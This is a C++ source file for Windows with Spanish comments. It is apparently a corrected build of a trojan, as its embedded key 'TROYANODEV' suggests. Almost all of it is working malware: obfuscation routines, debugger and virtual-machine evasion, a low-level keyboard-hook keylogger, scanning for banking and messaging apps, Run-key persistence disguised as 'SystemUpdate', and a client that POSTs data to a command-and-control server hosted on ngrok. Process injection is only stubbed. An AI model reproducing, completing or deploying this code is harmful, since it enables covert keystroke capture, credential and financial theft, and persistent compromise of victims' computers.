/*
 * ============================================================
 * CÓDIGO CORREGIDO - Visual Studio C++
 * ============================================================
 */
#undef UNICODE
#undef _UNICODE
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winreg.h>
#include <wininet.h>          // AÑADIDO: Para funciones Internet*
#include <winternl.h>         // AÑADIDO: Para NTSTATUS, PROCESS_BASIC_INFORMATION
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <memory>
#include <map>
#include <functional>         // AÑADIDO: Para std::function

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")    // AÑADIDO: Para WinINet
#pragma comment(lib, "ntdll.lib")      // AÑADIDO: Para funciones NT

 // ============================================================
 // DEFINICIONES FALTANTES DE WINDOWS API
 // ============================================================

 // Definiciones para funciones NT nativas que no están en headers estándar
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
    );

typedef NTSTATUS(NTAPI* pNtReplaceTokenEx)(
    HANDLE ProcessHandle,
    HANDLE TokenHandle
    );

// Constantes faltantes
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef ProcessBasicInformation
#define ProcessBasicInformation 0
#endif

// ============================================================
// SECCIÓN 1: OFUSCACIÓN AVANZADA
// ============================================================

namespace Ofuscacion {
    const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    std::string xor_encrypt(const std::string& data, const unsigned char* key, size_t key_len) {
        std::string result;
        result.reserve(data.size());
        for (size_t i = 0; i < data.size(); ++i) {
            result += static_cast<char>(data[i] ^ key[i % key_len]);
        }
        return result;
    }

    std::string encode_base64(const unsigned char* data, size_t len) {
        std::string result;
        int i = 0;
        unsigned char char_array_3[3];
        unsigned char char_array_4[4];

        while (len--) {
            char_array_3[i++] = *(data++);
            if (i == 3) {
                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;
                for (int j = 0; j < 4; j++)
                    result += base64_table[char_array_4[j]];
                i = 0;
            }
        }

        if (i) {
            for (int j = i; j < 3; j++)
                char_array_3[j] = '\0';

            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

            for (int j = 0; j < (i + 1); j++)
                result += base64_table[char_array_4[j]];

            while ((i++ < 3))
                result += '=';
        }

        return result;
    }

    std::string decode_base64(const std::string& encoded) {
        std::string result;
        int in_len = encoded.size();
        int i = 0;
        int j = 0;
        int in_ = 0;
        unsigned char char_array_4[4], char_array_3[3];

        while (in_len-- && (encoded[in_] != '=') &&
            (isalnum(encoded[in_]) || encoded[in_] == '+' || encoded[in_] == '/')) {
            char_array_4[i++] = encoded[in_]; in_++;
            if (i == 4) {
                for (j = 0; j < 64; j++)
                    if (base64_table[j] == char_array_4[0]) char_array_4[0] = j;
                for (j = 0; j < 64; j++)
                    if (base64_table[j] == char_array_4[1]) char_array_4[1] = j;
                for (j = 0; j < 64; j++)
                    if (base64_table[j] == char_array_4[2]) char_array_4[2] = j;
                for (j = 0; j < 64; j++)
                    if (base64_table[j] == char_array_4[3]) char_array_4[3] = j;

                char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
                char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
                char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

                for (j = 0; j < 3; j++)
                    result += char_array_3[j];
                i = 0;
            }
        }

        if (i) {
            for (j = i; j < 4; j++)
                char_array_4[j] = 0;

            for (j = 0; j < 64; j++)
                if (base64_table[j] == char_array_4[0]) char_array_4[0] = j;
            for (j = 0; j < 64; j++)
                if (base64_table[j] == char_array_4[1]) char_array_4[1] = j;
            for (j = 0; j < 64; j++)
                if (base64_table[j] == char_array_4[2]) char_array_4[2] = j;
            for (j = 0; j < 64; j++)
                if (base64_table[j] == char_array_4[3]) char_array_4[3] = j;

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (j = 0; j < (i - 1); j++)
                result += char_array_3[j];
        }

        return result;
    }

    std::string multi_layer_encrypt(const std::string& data, const unsigned char* key1, size_t len1,
        const unsigned char* key2, size_t len2) {
        std::string encrypted = xor_encrypt(data, key1, len1);
        return encode_base64(reinterpret_cast<const unsigned char*>(encrypted.c_str()), encrypted.size());
    }
}

// ============================================================
// SECCIÓN 2: CONFIGURACIÓN Y CONSTANTES
// ============================================================

namespace Config {
    const unsigned char XOR_KEY[] = { 'T', 'R', 'O', 'Y', 'A', 'N', 'O', 'D', 'E', 'V' };
    const size_t XOR_KEY_LEN = sizeof(XOR_KEY);

    const char* C2_SERVER = "https://flap-snarl-angelfish.ngrok-free.dev";
    const int C2_PORT = 443;

    const unsigned long KEYLOG_INTERVAL = 50;
    const unsigned long EXFILTRATION_INTERVAL = 60000;
    const unsigned long SLEEP_INTERVAL = 100;

    std::vector<std::string> TARGET_PROCESSES = {
        "explorer.exe", "svchost.exe", "winlogon.exe",
        "taskhostw.exe", "spoolsv.exe"
    };

    const wchar_t* PERSISTENCE_KEY = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    const wchar_t* STARTUP_KEY = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
}

// ============================================================
// SECCIÓN 3: CLASES PRINCIPALES
// ============================================================

// --- Clase Anti-Debugging ---
class AntiDebugger {
private:
    bool debug_detected;
    bool virtualized;

public:
    AntiDebugger() : debug_detected(false), virtualized(false) {}

    bool check_debugger() {
        if (IsDebuggerPresent()) {
            debug_detected = true;
            return true;
        }

        // Check using NtQueryInformationProcess
        HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
        if (hNtDll) {
            auto NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");
            if (NtQueryInformationProcess) {
                DWORD debugPort = 0;
                NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(),
                    (PROCESSINFOCLASS)7, &debugPort, sizeof(debugPort), NULL);
                if (NT_SUCCESS(status) && debugPort != 0) {
                    debug_detected = true;
                    return true;
                }
            }
        }

        return false;
    }

    bool check_virtualization() {
        // Check for common VM strings
        std::vector<std::string> vm_strings = {
            "vmware", "virtualbox", "qemu", "hyper-v",
            "xen", "kvm", "vbox", "parallels"
        };

        char computerName[MAX_PATH];
        DWORD size = MAX_PATH;
        GetComputerNameA(computerName, &size);

        std::string lowerName = computerName;
        std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::tolower);

        for (const auto& vm : vm_strings) {
            if (lowerName.find(vm) != std::string::npos) {
                virtualized = true;
                return true;
            }
        }

        // Check for VM processes
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);

            if (Process32First(hSnapshot, &pe32)) {
                do {
                    std::string procName = pe32.szExeFile;
                    std::transform(procName.begin(), procName.end(), procName.begin(), ::tolower);

                    for (const auto& vm : vm_strings) {
                        if (procName.find(vm) != std::string::npos) {
                            virtualized = true;
                            CloseHandle(hSnapshot);
                            return true;
                        }
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
        }

        return false;
    }

    void evade_debugger() {
        if (debug_detected || virtualized) {
            // Exit process or sleep
            ExitProcess(0);
        }
    }

    bool is_detected() const { return debug_detected || virtualized; }
};

// --- Clase Keylogger ---
class KeyLogger {
private:
    std::vector<std::string> keylog_data;
    std::map<int, char> vk_to_char_map;
    HHOOK hKeyboardHook;
    HHOOK hMsgHook;

    // Static callback functions for hooks
    static LRESULT CALLBACK LowLevelKeyboardProcStatic(int nCode, WPARAM wParam, LPARAM lParam);
    static LRESULT CALLBACK HookProcStatic(int code, WPARAM wParam, LPARAM lParam);
    static KeyLogger* instance;

public:
    KeyLogger() : hKeyboardHook(NULL), hMsgHook(NULL) {
        instance = this;

        // Initialize key mappings
        for (char c = 'A'; c <= 'Z'; c++) {
            vk_to_char_map[0x41 + (c - 'A')] = c;
        }
        for (char c = '0'; c <= '9'; c++) {
            vk_to_char_map[0x30 + (c - '0')] = c;
        }
        vk_to_char_map[VK_SPACE] = ' ';
        vk_to_char_map[VK_RETURN] = '\n';
        vk_to_char_map[VK_TAB] = '\t';
        vk_to_char_map[VK_BACK] = '\b';
    }

    void hook_message_api() {
        // Set low-level keyboard hook
        hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProcStatic,
            GetModuleHandle(NULL), 0);

        if (hKeyboardHook) {
            std::cout << "[+] Keylogger Hook instalado exitosamente" << std::endl;
        }
    }

    void processKey(int vkCode, WPARAM wParam) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            char key_char = 0;

            auto it = vk_to_char_map.find(vkCode);
            if (it != vk_to_char_map.end()) {
                key_char = it->second;
            }

            if (key_char) {
                std::string entry;
                entry += key_char;
                keylog_data.push_back(entry);
            }
        }
    }

    std::vector<std::string> get_keylog_data() const {
        return keylog_data;
    }

    void clear_buffer() {
        keylog_data.clear();
    }

    void unhook() {
        if (hKeyboardHook) {
            UnhookWindowsHookEx(hKeyboardHook);
            hKeyboardHook = NULL;
        }
    }
};

KeyLogger* KeyLogger::instance = NULL;

LRESULT CALLBACK KeyLogger::LowLevelKeyboardProcStatic(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && instance) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        instance->processKey(p->vkCode, wParam);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK KeyLogger::HookProcStatic(int code, WPARAM wParam, LPARAM lParam) {
    return CallNextHookEx(NULL, code, wParam, lParam);
}

// --- Clase AppScanner ---
class AppScanner {
private:
    std::vector<std::string> scanned_apps;
    std::map<std::string, std::string> app_paths;

public:
    void scan_registry() {
        HKEY hKey;
        LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0,
            KEY_READ | KEY_WOW64_32KEY, &hKey);

        if (result == ERROR_SUCCESS) {
            char sub_key[MAX_PATH];
            DWORD sub_key_len = MAX_PATH;
            DWORD index = 0;

            while (RegEnumKeyExA(hKey, index++, sub_key, &sub_key_len, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                if (is_banking_app(sub_key)) {
                    scanned_apps.push_back(sub_key);
                }
                sub_key_len = MAX_PATH;
            }
            RegCloseKey(hKey);
        }
    }

    void scan_user_registry() {
        HKEY hKey;
        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0,
            KEY_READ | KEY_WOW64_32KEY, &hKey);

        if (result == ERROR_SUCCESS) {
            char sub_key[MAX_PATH];
            DWORD sub_key_len = MAX_PATH;
            DWORD index = 0;

            while (RegEnumKeyExA(hKey, index++, sub_key, &sub_key_len, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                if (is_banking_app(sub_key)) {
                    scanned_apps.push_back(sub_key);
                }
                sub_key_len = MAX_PATH;
            }
            RegCloseKey(hKey);
        }
    }

    void scan_directories() {
        // Simplified directory scanning
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA("C:\\Program Files\\*", &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    std::string dirName = findData.cFileName;
                    if (is_banking_app(dirName)) {
                        scanned_apps.push_back(dirName);
                    }
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }
    }

    bool is_banking_app(const std::string& app_name) {
        std::vector<std::string> banking_keywords = {
            "bank", "finance", "money", "credit", "card", "payment",
            "chase", "wells fargo", "citibank", "hsbc", "paypal"
        };

        std::string lower_app = app_name;
        std::transform(lower_app.begin(), lower_app.end(), lower_app.begin(), ::tolower);

        for (const auto& keyword : banking_keywords) {
            if (lower_app.find(keyword) != std::string::npos) {
                return true;
            }
        }
        return false;
    }

    std::vector<std::string> get_scanned_apps() const {
        return scanned_apps;
    }

    std::map<std::string, std::string> get_app_paths() const {
        return app_paths;
    }
};

// --- Clase SMSStealer ---
class SMSStealer {
private:
    std::vector<std::string> sms_data;
    std::vector<std::string> scanned_apps;  // FIXED: Added missing member

public:
    void scan_sms_registry() {
        // Simplified SMS scanning
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char subKey[MAX_PATH];
            DWORD len = MAX_PATH;
            DWORD index = 0;

            while (RegEnumKeyExA(hKey, index++, subKey, &len, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                if (is_sms_app(subKey)) {
                    scanned_apps.push_back(subKey);
                }
                len = MAX_PATH;
            }
            RegCloseKey(hKey);
        }
    }

    bool is_sms_app(const std::string& app_name) {
        std::vector<std::string> sms_keywords = {
            "sms", "whatsapp", "telegram", "signal", "message"
        };

        std::string lower = app_name;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

        for (const auto& kw : sms_keywords) {
            if (lower.find(kw) != std::string::npos) return true;
        }
        return false;
    }

    void scan_sms_directories() {
        // Placeholder
    }

    std::vector<std::string> get_sms_apps() const {
        return scanned_apps;
    }

    std::vector<std::string> get_sms_directories() const {
        return sms_data;
    }
};

// --- Clase C2Client ---
class C2Client {
private:
    std::string server_ip;
    int server_port;

public:
    C2Client(const char* ip, int port) : server_ip(ip), server_port(port) {}

    bool send_data_to_c2(const std::string& data) {
        HINTERNET hSession = InternetOpenA("Agent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hSession) return false;

        HINTERNET hConnect = InternetConnectA(hSession, server_ip.c_str(),
            (INTERNET_PORT)server_port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

        if (!hConnect) {
            InternetCloseHandle(hSession);
            return false;
        }

        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/data",
            NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);

        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
            return false;
        }

        // Headers
        std::string headers = "Content-Type: application/json\r\n";

        BOOL result = HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
            (LPVOID)data.c_str(), data.length());

        if (!result) {
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
            return false;
        }

        // Read response
        char buffer[4096];
        DWORD bytesRead = 0;
        std::string response;

        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }

        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);

        return true;
    }

    bool receive_commands() {
        // Simplified implementation
        return true;
    }
};

// --- Clase Persistence ---
class Persistence {
public:
    bool register_persistence() {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);

        HKEY hKey;
        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
            KEY_SET_VALUE, &hKey);

        if (result == ERROR_SUCCESS) {
            result = RegSetValueExA(hKey, "SystemUpdate", 0,
                REG_SZ, (const BYTE*)exePath, (DWORD)strlen(exePath) + 1);
            RegCloseKey(hKey);
            return result == ERROR_SUCCESS;
        }
        return false;
    }

    bool register_startup() {
        return register_persistence(); // Simplified
    }

    bool register_boot() {
        return false; // Requires admin - simplified
    }

    bool unregister_persistence() {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
            KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueA(hKey, "SystemUpdate");
            RegCloseKey(hKey);
            return true;
        }
        return false;
    }
};

// --- Clase ProcessInjector ---
class ProcessInjector {
public:
    bool inject_code(const std::string& target_process, const void* code, size_t code_size) {
        // Simplified - just finds process
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        BOOL found = FALSE;

        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, target_process.c_str()) == 0) {
                    found = TRUE;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);

        return found; // Simplified - just reports if found
    }

    bool inject_api_hook(const std::string& target_process,
        const char* api_name, FARPROC hook_function) {
        return false; // Simplified
    }
};

// ============================================================
// SECCIÓN 4: FUNCIÓN PRINCIPAL
// ============================================================

void Initialize() {
    std::cout << "============================================================" << std::endl;
    std::cout << "   SISTEMA INICIANDO..." << std::endl;
    std::cout << "============================================================" << std::endl;

    AntiDebugger anti_debugger;
    if (anti_debugger.check_debugger()) {
        std::cout << "[!] Debugger detectado. Saliendo..." << std::endl;
        anti_debugger.evade_debugger();
        return;
    }

    if (anti_debugger.check_virtualization()) {
        std::cout << "[!] VM detectada. Saliendo..." << std::endl;
        anti_debugger.evade_debugger();
        return;
    }

    Persistence persistence;
    persistence.register_persistence();

    KeyLogger* keylogger = new KeyLogger();
    keylogger->hook_message_api();

    AppScanner scanner;
    scanner.scan_registry();
    scanner.scan_user_registry();

    std::cout << "[+] Apps detectadas: " << scanner.get_scanned_apps().size() << std::endl;

    SMSStealer sms_stealer;
    sms_stealer.scan_sms_registry();

    C2Client c2_client(Config::C2_SERVER, Config::C2_PORT);

    // Message loop for hooks
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    delete keylogger;
}

int main(int argc, char* argv[]) {
    Initialize();
    return 0;
}
// Para proyecto vacío - asegurar punto de entrada
#pragma comment(linker, "/ENTRY:mainCRTStartup")